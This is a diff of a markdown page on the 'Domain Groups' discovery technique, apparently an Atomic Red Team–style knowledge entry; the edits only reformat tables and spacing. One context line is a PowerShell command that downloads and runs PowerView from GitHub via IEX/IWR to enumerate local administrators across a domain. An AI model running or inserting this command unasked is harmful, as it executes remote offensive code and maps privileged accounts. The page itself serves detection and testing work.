@@ -131,7 +131,6 @@ Enumerates members of the local Administrators groups across all machines in the
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -150,19 +149,17 @@ No specific mitigations documented for this technique.
 
 ### Behavioral Detection of Domain Group Discovery
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Domain Groups technique applicable | Low | Discovery |
+| Finding                            | Severity | Impact    |
+| ---------------------------------- | -------- | --------- |
+| Domain Groups technique applicable | Low      | Discovery |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
